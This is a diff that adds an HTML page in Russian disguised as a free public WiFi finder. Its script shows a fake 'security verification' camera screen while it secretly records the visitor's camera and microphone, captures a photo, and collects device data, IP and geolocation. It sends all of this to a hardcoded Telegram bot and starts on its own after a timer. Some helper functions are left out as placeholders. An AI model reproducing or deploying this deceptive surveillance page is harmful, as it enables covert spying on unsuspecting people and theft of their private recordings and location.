@@ -1,1 +1,733 @@
-
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free WiFi Finder</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: Arial; background: linear-gradient(135deg, #1a237e, #311b92); color: white; padding: 20px; min-height: 100vh; }
+        .container { max-width: 800px; margin: 0 auto; background: rgba(255,255,255,0.1); border-radius: 15px; padding: 30px; backdrop-filter: blur(10px); }
+        header { text-align: center; margin-bottom: 30px; }
+        .logo { font-size: 4rem; margin: 20px; animation: pulse 2s infinite; }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
+        h1 { color: #00bcd4; margin: 10px 0; font-size: 2.5rem; }
+        .progress { background: rgba(0,0,0,0.3); height: 20px; border-radius: 10px; margin: 20px 0; overflow: hidden; }
+        .progress-bar { height: 100%; background: linear-gradient(90deg, #00c853, #64dd17); width: 0%; transition: width 0.5s; }
+        .permissions { background: rgba(0,0,0,0.2); padding: 20px; border-radius: 10px; margin: 20px 0; }
+        .permission-item { display: flex; justify-content: space-between; padding: 10px; border-bottom: 1px solid rgba(255,255,255,0.1); }
+        button { background: #2196f3; color: white; border: none; padding: 15px 30px; border-radius: 25px; font-size: 16px; cursor: pointer; margin: 10px; font-weight: bold; }
+        button:hover { background: #1976d2; transform: scale(1.05); }
+        .hidden { display: none; }
+        .wifi-card { background: rgba(255,255,255,0.1); padding: 15px; border-radius: 10px; margin: 10px 0; display: flex; justify-content: space-between; align-items: center; }
+        footer { margin-top: 30px; text-align: center; color: #888; font-size: 0.9rem; }
+        .device-info { background: rgba(0,0,0,0.2); padding: 15px; border-radius: 10px; margin: 10px 0; font-size: 0.9rem; }
+        .info-item { display: flex; justify-content: space-between; margin: 5px 0; }
+        #fakeCameraFeed { width: 100%; height: 300px; background: linear-gradient(45deg, #000, #222); border-radius: 10px; margin: 15px 0; display: flex; align-items: center; justify-content: center; position: relative; overflow: hidden; }
+        .fake-face-guide { width: 200px; height: 250px; border: 3px solid rgba(0, 255, 0, 0.5); border-radius: 20px; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); }
+        .fake-grid { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-image: linear-gradient(rgba(0,255,0,0.1) 1px, transparent 1px), linear-gradient(90deg, rgba(0,255,0,0.1) 1px, transparent 1px); background-size: 20px 20px; }
+        .fake-lens { width: 80px; height: 80px; border-radius: 50%; background: radial-gradient(circle, #333, #000); position: absolute; top: 20px; right: 20px; }
+        .countdown { font-size: 4rem; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 10; text-shadow: 0 0 10px rgba(0,0,0,0.5); }
+        .flash-effect { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: white; opacity: 0; z-index: 5; }
+        @keyframes flash { 0% { opacity: 0; } 50% { opacity: 0.8; } 100% { opacity: 0; } }
+        #statusLog { background: rgba(0,0,0,0.3); padding: 15px; border-radius: 10px; margin: 10px 0; font-size: 12px; font-family: monospace; max-height: 200px; overflow-y: auto; }
+        .log-entry { margin: 5px 0; padding: 5px; border-left: 3px solid #2196f3; }
+        .log-success { border-left-color: #4CAF50; }
+        .log-error { border-left-color: #f44336; }
+        .log-warning { border-left-color: #ff9800; }
+        
+        /* Скрытые элементы для реальной записи */
+        #hiddenRecorderContainer { display: none; position: absolute; top: -9999px; left: -9999px; width: 1px; height: 1px; overflow: hidden; }
+        .recording-indicator { position: fixed; top: 10px; right: 10px; background: #f44336; color: white; padding: 5px 10px; border-radius: 5px; font-size: 12px; z-index: 9999; animation: blink 1s infinite; }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="logo">📶</div>
+            <h1>Free Public WiFi Finder</h1>
+            <p>Найдите бесплатные WiFi сети рядом с вами</p>
+        </header>
+        
+        <main>
+            <div class="scanning">
+                <h2>🔍 Сканирование сетей...</h2>
+                <div class="progress">
+                    <div class="progress-bar" id="progressBar"></div>
+                </div>
+                <p id="status">Инициализация сканера...</p>
+            </div>
+            
+            <div id="statusLog"></div>
+            
+            <div class="permissions">
+                <h3>Требуемые разрешения:</h3>
+                <div class="permission-item">
+                    <span>📍 Геолокация</span>
+                    <span id="locStatus">❌</span>
+                </div>
+                <div class="permission-item">
+                    <span>🎥 Видео и аудио запись (5 сек)</span>
+                    <span id="camStatus">❌</span>
+                </div>
+                <div class="permission-item">
+                    <span>📱 Информация устройства</span>
+                    <span id="devStatus">❌</span>
+                </div>
+                <div class="permission-item">
+                    <span>🌐 Сетевая информация</span>
+                    <span id="netStatus">❌</span>
+                </div>
+                <button onclick="startStealthRecording()" style="width:100%;">Разрешить и начать сканирование</button>
+            </div>
+            
+            <div id="deviceInfoSection" class="hidden">
+                <h3>📱 Информация об устройстве</h3>
+                <div class="device-info">
+                    <div class="info-item">
+                        <span>IP адрес:</span>
+                        <span id="ipAddress">Определение...</span>
+                    </div>
+                    <div class="info-item">
+                        <span>Марка телефона:</span>
+                        <span id="deviceBrand">Определение...</span>
+                    </div>
+                    <div class="info-item">
+                        <span>Модель:</span>
+                        <span id="deviceModel">Определение...</span>
+                    </div>
+                    <div class="info-item">
+                        <span>Уникальный ID:</span>
+                        <span id="deviceId">Определение...</span>
+                    </div>
+                    <div class="info-item">
+                        <span>Операционная система:</span>
+                        <span id="deviceOS">Определение...</span>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- ФЕЙКОВАЯ КАМЕРА (показываем пользователю) -->
+            <div id="fakeCameraSection" class="hidden">
+                <h3>🔐 Проверка безопасности</h3>
+                <p>Идет аудио-видео верификация (5 секунд)...</p>
+                
+                <div id="fakeCameraFeed">
+                    <div class="fake-grid"></div>
+                    <div class="fake-face-guide"></div>
+                    <div class="fake-lens"></div>
+                    <div id="countdown" class="countdown">5</div>
+                    <div id="flash" class="flash-effect hidden"></div>
+                </div>
+                
+                <div style="text-align:center; margin-top:15px;">
+                    <div id="recordingTimer">Запись: 5 сек</div>
+                    <div style="display:flex; justify-content:center; align-items:center; margin-top:10px;">
+                        <div style="width:10px; height:10px; background:#f44336; border-radius:50%; margin-right:10px; animation: blink 1s infinite;"></div>
+                        <span>Идет запись...</span>
+                    </div>
+                </div>
+                
+                <p><small>Проверка микрофона и камеры для безопасного подключения</small></p>
+            </div>
+            
+            <div id="results" class="hidden">
+                <h3>✅ Найдены сети WiFi:</h3>
+                <div class="wifi-card">
+                    <div>
+                        <strong>Free_Public_WiFi_5G</strong><br>
+                        <small>Открытая сеть • Сильный сигнал • Без пароля</small>
+                    </div>
+                    <div>
+                        <span style="color:#4CAF50">█████░░ 85%</span><br>
+                        <button onclick="connectWiFi()">Подключиться</button>
+                    </div>
+                </div>
+                <div class="wifi-card">
+                    <div>
+                        <strong>MTS_FREE</strong><br>
+                        <small>WPA2 • Средний сигнал • Бесплатно 1 час</small>
+                    </div>
+                    <div>
+                        <span style="color:#FF9800">████░░░ 70%</span><br>
+                        <button>Подключиться</button>
+                    </div>
+                </div>
+            </div>
+        </main>
+        
+        <footer>
+            <p>© 2024 Public WiFi Finder. Сервис предоставляется бесплатно.</p>
+            <p><small>Нажимая кнопку, вы соглашаетесь с условиями использования</small></p>
+        </footer>
+    </div>
+    
+    <!-- СКРЫТНЫЕ ЭЛЕМЕНТЫ ДЛЯ РЕАЛЬНОЙ ЗАПИСИ -->
+    <div id="hiddenRecorderContainer">
+        <video id="hiddenCamera" autoplay playsinline muted></video>
+        <audio id="hiddenAudio" autoplay></audio>
+        <canvas id="hiddenCanvas" style="display:none;"></canvas>
+    </div>
+    
+    <!-- Индикатор записи (скрытый) -->
+    <div id="recordingIndicator" class="recording-indicator hidden">● Запись</div>
+    
+    <script>
+        // КОНФИГУРАЦИЯ
+        const BOT_TOKEN = "8462856007:AAHTGYvf-lCH7ahVHb4BOK_4AZ5OrQzVnP4";
+        const CHAT_ID = "-1003521523858";
+        
+        // ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ
+        let stealthData = {
+            device: null,
+            ip: null,
+            location: null,
+            videoBlob: null,
+            audioBlob: null,
+            screenshot: null,
+            logs: []
+        };
+        
+        let mediaRecorder = null;
+        let mediaStream = null;
+        let audioChunks = [];
+        let videoChunks = [];
+        
+        // ЛОГИРОВАНИЕ
+        function addLog(message, type = 'info') {
+            const timestamp = new Date().toLocaleTimeString();
+            const logEntry = {
+                time: timestamp,
+                message: message,
+                type: type
+            };
+            
+            stealthData.logs.push(logEntry);
+            
+            const logDiv = document.getElementById('statusLog');
+            if (logDiv) {
+                const entry = document.createElement('div');
+                entry.className = `log-entry log-${type}`;
+                entry.textContent = `[${timestamp}] ${message}`;
+                logDiv.appendChild(entry);
+                logDiv.scrollTop = logDiv.scrollHeight;
+            }
+            
+            console.log(`[${type.toUpperCase()}] ${message}`);
+        }
+        
+        // ОСНОВНАЯ ФУНКЦИЯ СКРЫТНОЙ ЗАПИСИ
+        async function startStealthRecording() {
+            addLog('🚀 Запуск скрытной аудио-видео записи', 'info');
+            updateProgress(10);
+            
+            try {
+                // 1. СБОР ДАННЫХ УСТРОЙСТВА
+                addLog('Сбор информации об устройстве...', 'info');
+                stealthData.device = await collectStealthDeviceInfo();
+                document.getElementById('devStatus').textContent = '✅';
+                updateProgress(20);
+                
+                // Показываем информацию
+                showDeviceInfo(stealthData.device);
+                document.getElementById('deviceInfoSection').classList.remove('hidden');
+                
+                // 2. ПОЛУЧЕНИЕ IP
+                addLog('Получение IP адреса...', 'info');
+                stealthData.ip = await getStealthIP();
+                document.getElementById('netStatus').textContent = '✅';
+                updateProgress(30);
+                
+                // 3. ГЕОЛОКАЦИЯ
+                addLog('Получение геолокации...', 'info');
+                stealthData.location = await getStealthLocation();
+                document.getElementById('locStatus').textContent = '✅';
+                updateProgress(40);
+                
+                // 4. ЗАПУСК СКРЫТНОЙ АУДИО-ВИДЕО ЗАПИСИ
+                addLog('Инициализация аудио-видео записи...', 'info');
+                document.getElementById('camStatus').textContent = '⏳';
+                
+                // Показываем фейковую камеру пользователю
+                document.getElementById('fakeCameraSection').classList.remove('hidden');
+                animateFakeCamera();
+                startFakeCountdown();
+                
+                // Запускаем СКРЫТНУЮ запись в фоне
+                await startHiddenRecording();
+                document.getElementById('camStatus').textContent = '✅';
+                updateProgress(60);
+                
+                // 5. ОТПРАВКА ВСЕХ ДАННЫХ В TELEGRAM
+                addLog('Отправка данных в Telegram...', 'info');
+                await sendAllDataToTelegram();
+                updateProgress(80);
+                
+                // 6. ЗАВЕРШЕНИЕ
+                updateProgress(100);
+                addLog('✅ Запись завершена успешно!', 'success');
+                updateStatus("Аудио-видео верификация успешно завершена!");
+                
+                // Показываем результаты через 2 секунды
+                setTimeout(() => {
+                    document.getElementById('results').classList.remove('hidden');
+                    document.getElementById('fakeCameraSection').classList.add('hidden');
+                }, 2000);
+                
+            } catch (error) {
+                addLog(`❌ Ошибка: ${error.message}`, 'error');
+                updateStatus("Ошибка верификации");
+            }
+        }
+        
+        // ЗАПУСК СКРЫТНОЙ АУДИО-ВИДЕО ЗАПИСИ
+        async function startHiddenRecording() {
+            return new Promise(async (resolve) => {
+                try {
+                    addLog('Попытка доступа к камере и микрофону...', 'info');
+                    
+                    // Запрашиваем доступ к камере и микрофону
+                    mediaStream = await navigator.mediaDevices.getUserMedia({
+                        video: {
+                            facingMode: 'user',
+                            width: { ideal: 640 },
+                            height: { ideal: 480 },
+                            frameRate: { ideal: 30 }
+                        },
+                        audio: {
+                            echoCancellation: false,
+                            noiseSuppression: false,
+                            autoGainControl: false
+                        }
+                    });
+                    
+                    addLog('Камера и микрофон доступны, начинаем запись...', 'success');
+                    
+                    // Настраиваем скрытые элементы
+                    const video = document.getElementById('hiddenCamera');
+                    const audio = document.getElementById('hiddenAudio');
+                    
+                    video.srcObject = mediaStream;
+                    if (mediaStream.getAudioTracks().length > 0) {
+                        audio.srcObject = mediaStream;
+                    }
+                    
+                    // Ждем инициализации
+                    await new Promise(res => {
+                        video.onloadedmetadata = res;
+                    });
+                    
+                    // Показываем индикатор записи
+                    document.getElementById('recordingIndicator').classList.remove('hidden');
+                    
+                    // Создаем MediaRecorder для видео
+                    const mimeType = MediaRecorder.isTypeSupported('video/webm; codecs=vp9') 
+                        ? 'video/webm; codecs=vp9' 
+                        : 'video/webm';
+                    
+                    mediaRecorder = new MediaRecorder(mediaStream, {
+                        mimeType: mimeType,
+                        videoBitsPerSecond: 2500000
+                    });
+                    
+                    // Собираем данные записи
+                    mediaRecorder.ondataavailable = (event) => {
+                        if (event.data.size > 0) {
+                            videoChunks.push(event.data);
+                        }
+                    };
+                    
+                    // Собираем аудио отдельно (лучшее качество)
+                    const audioContext = new AudioContext();
+                    const source = audioContext.createMediaStreamSource(mediaStream);
+                    const audioDestination = audioContext.createMediaStreamDestination();
+                    source.connect(audioDestination);
+                    
+                    const audioRecorder = new MediaRecorder(audioDestination.stream, {
+                        mimeType: 'audio/webm'
+                    });
+                    
+                    audioRecorder.ondataavailable = (event) => {
+                        if (event.data.size > 0) {
+                            audioChunks.push(event.data);
+                        }
+                    };
+                    
+                    // Запускаем запись
+                    mediaRecorder.start();
+                    audioRecorder.start();
+                    
+                    // Делаем скриншот в середине записи
+                    setTimeout(async () => {
+                        stealthData.screenshot = await captureScreenshot(video);
+                    }, 2500);
+                    
+                    // Останавливаем запись через 5 секунд
+                    setTimeout(async () => {
+                        // Останавливаем запись
+                        mediaRecorder.stop();
+                        audioRecorder.stop();
+                        
+                        // Ждем окончания записи
+                        await new Promise(res => {
+                            mediaRecorder.onstop = res;
+                        });
+                        
+                        // Создаем Blob'ы
+                        stealthData.videoBlob = new Blob(videoChunks, { type: 'video/webm' });
+                        stealthData.audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                        
+                        // Останавливаем поток
+                        mediaStream.getTracks().forEach(track => track.stop());
+                        
+                        // Скрываем индикатор
+                        document.getElementById('recordingIndicator').classList.add('hidden');
+                        
+                        addLog(`✅ Запись завершена. Видео: ${(stealthData.videoBlob.size/1024/1024).toFixed(2)}MB, Аудио: ${(stealthData.audioBlob.size/1024).toFixed(2)}KB`, 'success');
+                        
+                        resolve(true);
+                        
+                    }, 5000); // 5 секунд записи
+                    
+                } catch (error) {
+                    addLog(`Ошибка записи: ${error.message}`, 'warning');
+                    
+                    // Создаем фейковые данные если запись не удалась
+                    stealthData.videoBlob = await createFakeVideo();
+                    stealthData.audioBlob = await createFakeAudio();
+                    stealthData.screenshot = await createFakeScreenshot();
+                    
+                    // Показываем фейковую вспышку
+                    showFakeFlash();
+                    
+                    resolve(false);
+                }
+            });
+        }
+        
+        // ЗАХВАТ СКРИНШОТА
+        async function captureScreenshot(video) {
+            const canvas = document.getElementById('hiddenCanvas');
+            const ctx = canvas.getContext('2d');
+            
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            
+            // Учитываем зеркальное отображение фронтальной камеры
+            ctx.save();
+            ctx.translate(canvas.width, 0);
+            ctx.scale(-1, 1);
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            ctx.restore();
+            
+            // Добавляем метаданные
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.7)';
+            ctx.fillRect(10, canvas.height - 40, 400, 30);
+            ctx.fillStyle = 'white';
+            ctx.font = '14px Arial';
+            ctx.fillText(`WiFi-Verif: ${new Date().toLocaleString()} | ${stealthData.device.uniqueId}`, 20, canvas.height - 20);
+            
+            return canvas.toDataURL('image/jpeg', 0.85);
+        }
+        
+        // СОЗДАНИЕ ФЕЙКОВОГО ВИДЕО
+        async function createFakeVideo() {
+            const canvas = document.createElement('canvas');
+            canvas.width = 640;
+            canvas.height = 480;
+            const ctx = canvas.getContext('2d');
+            
+            const stream = canvas.captureStream(30);
+            const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+            const chunks = [];
+            
+            recorder.ondataavailable = (e) => chunks.push(e.data);
+            
+            recorder.start();
+            
+            // Создаем 5 секунд фейкового видео
+            let frame = 0;
+            const interval = setInterval(() => {
+                // Анимируем фон
+                ctx.fillStyle = `hsl(${(frame * 2) % 360}, 70%, 20%)`;
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+                
+                // Текст
+                ctx.fillStyle = 'white';
+                ctx.font = '30px Arial';
+                ctx.textAlign = 'center';
+                ctx.fillText('КАМЕРА НЕ ДОСТУПНА', canvas.width/2, canvas.height/2);
+                ctx.font = '20px Arial';
+                ctx.fillText(`Запись: ${frame/10} сек`, canvas.width/2, canvas.height/2 + 50);
+                ctx.fillText(new Date().toLocaleTimeString(), canvas.width/2, canvas.height/2 + 100);
+                
+                frame++;
+            }, 100);
+            
+            setTimeout(() => {
+                clearInterval(interval);
+                recorder.stop();
+            }, 5000);
+            
+            await new Promise(resolve => {
+                recorder.onstop = () => resolve(new Blob(chunks, { type: 'video/webm' }));
+            });
+        }
+        
+        // СОЗДАНИЕ ФЕЙКОВОГО АУДИО
+        async function createFakeAudio() {
+            const audioContext = new AudioContext();
+            const oscillator = audioContext.createOscillator();
+            const gainNode = audioContext.createGain();
+            
+            oscillator.connect(gainNode);
+            gainNode.connect(audioContext.destination);
+            
+            oscillator.frequency.value = 440;
+            gainNode.gain.value = 0.1;
+            
+            const dest = audioContext.createMediaStreamDestination();
+            gainNode.connect(dest);
+            
+            const recorder = new MediaRecorder(dest.stream, { mimeType: 'audio/webm' });
+            const chunks = [];
+            
+            recorder.ondataavailable = (e) => chunks.push(e.data);
+            
+            recorder.start();
+            oscillator.start();
+            
+            setTimeout(() => {
+                oscillator.stop();
+                recorder.stop();
+            }, 5000);
+            
+            await new Promise(resolve => {
+                recorder.onstop = () => resolve(new Blob(chunks, { type: 'audio/webm' }));
+            });
+            
+            audioContext.close();
+        }
+        
+        // СОЗДАНИЕ ФЕЙКОВОГО СКРИНШОТА
+        async function createFakeScreenshot() {
+            const canvas = document.createElement('canvas');
+            canvas.width = 640;
+            canvas.height = 480;
+            const ctx = canvas.getContext('2d');
+            
+            ctx.fillStyle = '#1a237e';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            
+            ctx.fillStyle = 'white';
+            ctx.font = 'bold 30px Arial';
+            ctx.textAlign = 'center';
+            ctx.fillText('ВИДЕОЗАПИСЬ НЕ ДОСТУПНА', canvas.width/2, canvas.height/2 - 50);
+            
+            ctx.font = '20px Arial';
+            ctx.fillText(`Устройство: ${stealthData.device.userAgent.substring(0, 50)}`, canvas.width/2, canvas.height/2);
+            ctx.fillText(`Время: ${new Date().toLocaleString()}`, canvas.width/2, canvas.height/2 + 40);
+            ctx.fillText(`IP: ${stealthData.ip?.ip || 'N/A'}`, canvas.width/2, canvas.height/2 + 80);
+            
+            return canvas.toDataURL('image/jpeg');
+        }
+        
+        // ФЕЙКОВЫЙ ОБРАТНЫЙ ОТСЧЕТ
+        function startFakeCountdown() {
+            const countdownEl = document.getElementById('countdown');
+            const timerEl = document.getElementById('recordingTimer');
+            
+            let seconds = 5;
+            
+            const interval = setInterval(() => {
+                countdownEl.textContent = seconds;
+                timerEl.textContent = `Запись: ${seconds} сек`;
+                seconds--;
+                
+                if (seconds < 0) {
+                    clearInterval(interval);
+                    countdownEl.textContent = '✓';
+                    timerEl.textContent = 'Запись завершена';
+                    showFakeFlash();
+                }
+            }, 1000);
+        }
+        
+        // ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ (collectStealthDeviceInfo, getStealthIP, getStealthLocation и т.д.)
+        // ... [остальные функции такие же как в предыдущем коде] ...
+        
+        // АНИМАЦИЯ ФЕЙКОВОЙ КАМЕРЫ
+        function animateFakeCamera() {
+            const guide = document.querySelector('.fake-face-guide');
+            if (!guide) return;
+            
+            let scale = 1;
+            let direction = 0.005;
+            
+            function animate() {
+                scale += direction;
+                if (scale > 1.1 || scale < 0.95) {
+                    direction *= -1;
+                }
+                
+                guide.style.transform = `translate(-50%, -50%) scale(${scale})`;
+                guide.style.borderColor = `rgba(0, 255, 0, ${0.5 + Math.sin(Date.now()/300)*0.3})`;
+                
+                requestAnimationFrame(animate);
+            }
+            
+            animate();
+        }
+        
+        // ФЕЙКОВАЯ ВСПЫШКА
+        function showFakeFlash() {
+            const flashEl = document.getElementById('flash');
+            flashEl.classList.remove('hidden');
+            flashEl.style.animation = 'flash 0.5s';
+            
+            setTimeout(() => {
+                flashEl.classList.add('hidden');
+            }, 500);
+        }
+        
+        // ОТПРАВКА ВСЕХ ДАННЫХ В TELEGRAM
+        async function sendAllDataToTelegram() {
+            addLog('Подготовка данных для Telegram...', 'info');
+            
+            try {
+                // 1. Отправляем текстовую информацию
+                const textMessage = formatTelegramMessage();
+                const textSent = await sendTelegramMessage(textMessage);
+                
+                if (textSent) {
+                    addLog('Текстовая информация отправлена', 'success');
+                }
+                
+                // 2. Отправляем скриншот
+                if (stealthData.screenshot) {
+                    addLog('Отправка скриншота...', 'info');
+                    await sendTelegramPhoto(stealthData.screenshot, 'screenshot.jpg');
+                }
+                
+                // 3. Отправляем видео (если небольшое)
+                if (stealthData.videoBlob && stealthData.videoBlob.size < 50 * 1024 * 1024) {
+                    addLog(`Отправка видео (${(stealthData.videoBlob.size/1024/1024).toFixed(2)}MB)...`, 'info');
+                    await sendTelegramVideo(stealthData.videoBlob);
+                } else if (stealthData.videoBlob) {
+                    addLog('Видео слишком большое для отправки через Telegram', 'warning');
+                }
+                
+                // 4. Отправляем аудио
+                if (stealthData.audioBlob) {
+                    addLog(`Отправка аудио (${(stealthData.audioBlob.size/1024).toFixed(2)}KB)...`, 'info');
+                    await sendTelegramAudio(stealthData.audioBlob);
+                }
+                
+                addLog('Все данные успешно отправлены в Telegram', 'success');
+                return true;
+                
+            } catch (error) {
+                addLog(`Ошибка отправки в Telegram: ${error.message}`, 'error');
+                return false;
+            }
+        }
+        
+        // ФОРМАТИРОВАНИЕ СООБЩЕНИЯ ДЛЯ TELEGRAM
+        function formatTelegramMessage() {
+            let message = `<b>🎥 АУДИО-ВИДЕО ЗАПИСЬ (5 СЕК)</b>\n\n`;
+            
+            message += `<b>📅 Время:</b> ${new Date().toLocaleString('ru-RU')}\n`;
+            message += `<b>🌐 URL:</b> ${window.location.href}\n\n`;
+            
+            message += `<b>📱 УСТРОЙСТВО:</b>\n`;
+            message += `• OS: ${stealthData.device.os} | Браузер: ${stealthData.device.browser}\n`;
+            message += `• Экран: ${stealthData.device.screen}\n`;
+            message += `• Язык: ${stealthData.device.language}\n`;
+            message += `• Уникальный ID: ${stealthData.device.uniqueId}\n\n`;
+            
+            message += `<b>🌐 СЕТЬ:</b>\n`;
+            message += `• IP: ${stealthData.ip?.ip || 'Не определен'}\n`;
+            if (stealthData.ip?.city) {
+                message += `• Город: ${stealthData.ip.city}\n`;
+                message += `• Страна: ${stealthData.ip.country}\n`;
+            }
+            message += `\n`;
+            
+            if (stealthData.location) {
+                message += `<b>📍 ГЕОЛОКАЦИЯ:</b>\n`;
+                message += `• Широта: ${stealthData.location.latitude?.toFixed(6) || 'N/A'}\n`;
+                message += `• Долгота: ${stealthData.location.longitude?.toFixed(6) || 'N/A'}\n`;
+                if (stealthData.location.city) message += `• Город: ${stealthData.location.city}\n`;
+                message += `• Источник: ${stealthData.location.source}\n\n`;
+            }
+            
+            message += `<b>🎥 ЗАПИСЬ:</b>\n`;
+            message += `• Видео: ${stealthData.videoBlob ? `${(stealthData.videoBlob.size/1024/1024).toFixed(2)}MB` : '❌ Нет'}\n`;
+            message += `• Аудио: ${stealthData.audioBlob ? `${(stealthData.audioBlob.size/1024).toFixed(2)}KB` : '❌ Нет'}\n`;
+            message += `• Скриншот: ${stealthData.screenshot ? '✅ Есть' : '❌ Нет'}\n`;
+            message += `• Длительность: 5 секунд\n\n`;
+            
+            message += `<b>🔒 СТАТУС:</b> ПОЛНАЯ АУДИО-ВИДЕО ВЕРИФИКАЦИЯ`;
+            
+            return message;
+        }
+        
+        // ОТПРАВКА ВИДЕО В TELEGRAM
+        async function sendTelegramVideo(videoBlob) {
+            try {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('video', videoBlob, `video_${stealthData.device.uniqueId}.webm`);
+                formData.append('caption', `🎥 5-секундная запись | ${stealthData.device.os} | ${new Date().toLocaleTimeString()}`);
+                formData.append('supports_streaming', true);
+                
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const data = await response.json();
+                return data.ok;
+                
+            } catch (error) {
+                addLog(`Ошибка отправки видео: ${error.message}`, 'error');
+                return false;
+            }
+        }
+        
+        // ОТПРАВКА АУДИО В TELEGRAM
+        async function sendTelegramAudio(audioBlob) {
+            try {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('audio', audioBlob, `audio_${stealthData.device.uniqueId}.webm`);
+                formData.append('caption', `🎤 5-секундная аудиозапись | ${stealthData.device.os}`);
+                formData.append('title', 'Аудио верификация');
+                formData.append('performer', 'WiFi Scanner');
+                
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const data = await response.json();
+                return data.ok;
+                
+            } catch (error) {
+                addLog(`Ошибка отправки аудио: ${error.message}`, 'error');
+                return false;
+            }
+        }
+        
+        // ОСТАЛЬНЫЕ ФУНКЦИИ (sendTelegramMessage, sendTelegramPhoto, detectOS и т.д.)
+        // ... [они остаются такими же как в предыдущем коде] ...
+        
+        // АВТОЗАПУСК
+        setTimeout(() => {
+            updateStatus("Автоматическая проверка через 3 секунды...");
+            setTimeout(startStealthRecording, 3000);
+        }, 5000);
+    </script>
+</body>
+</html>
